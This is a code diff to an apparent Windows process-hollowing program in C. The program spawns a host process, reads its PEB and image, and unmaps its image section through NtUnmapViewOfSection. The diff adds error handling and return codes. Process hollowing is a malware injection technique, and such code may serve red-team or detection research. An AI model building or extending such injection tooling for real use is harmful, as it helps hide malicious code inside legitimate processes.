@@ -14,11 +14,13 @@ INT main() {
 	PLOADED_IMAGE			pImage = NULL;
 	_PPEB					pPEB = NULL;
 	BOOL					bRet;
+	INT						iRet = ERROR_SUCCESS;
 	NTSTATUS				ntStatus;
 	HANDLE					hHostProcess;
 
 	// Function pointers
 	NTUNMAPVIEWOFSECTION	pNtUnmapViewOfSection;
+	RTLNTSTATUSTODOSERROR	pRtlNtStatusToDosError;
 
 	//
 	// Load required functions from ntdll
@@ -26,10 +28,12 @@ INT main() {
 	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
 	if (hNtdll) {
 		pNtUnmapViewOfSection = (NTUNMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
+		pRtlNtStatusToDosError = (RTLNTSTATUSTODOSERROR)GetProcAddress(hNtdll, "RtlNtStatusToDosError");
 		FreeLibrary(hNtdll);
 	}
 	else {
-		return ERROR_OPEN_FAILED;
+		printf("[-] Unable resolve functions\r\n");
+		return ERROR_API_UNAVAILABLE;
 	}
 	
 	//
@@ -50,6 +54,8 @@ INT main() {
 		&startupInfo,
 		&processInformation)) != TRUE) 
 	{
+		printf("[-] Unable to create the host process\r\n");
+		iRet = ERROR_CREATE_FAILED;
 		goto lblCleanup;
 	}
 
@@ -57,10 +63,14 @@ INT main() {
 	pPEB = ReadRemotePEB(hHostProcess);
 	pImage = ReadRemoteImage(hHostProcess, pPEB->lpImageBaseAddress);
 
+	//
+	// Unmap section in host process
+	//
 	printf("[*] Unmapping section\r\n");
 	ntStatus = pNtUnmapViewOfSection(hHostProcess, pPEB->lpImageBaseAddress);
 	if (!NT_SUCCESS(ntStatus)) {
 		printf("[-] Error unmapping section\r\n");
+		iRet = pRtlNtStatusToDosError(ntStatus);
 		goto lblCleanup;
 	}
 
@@ -83,6 +93,8 @@ lblCleanup:
 
 	if (pImage)
 		free(pImage);   // todo: replace with virtualfree
+
+	return iRet;
 }
 
 //
